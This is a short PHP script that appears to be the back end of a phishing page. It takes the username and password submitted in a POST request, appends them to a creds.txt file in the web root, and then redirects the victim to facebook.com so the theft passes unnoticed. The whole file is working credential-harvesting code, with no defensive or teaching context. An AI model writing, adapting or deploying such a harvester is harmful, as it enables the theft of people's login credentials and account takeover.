<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = '/var/www/html/creds.txt';
    $data = "Username: " . $_POST['user'] . "\nPassword: " . $_POST['pass'] . "\n\n";
    file_put_contents($file, $data, FILE_APPEND);
    header('Location: https://facebook.com');
    exit();
}
?>
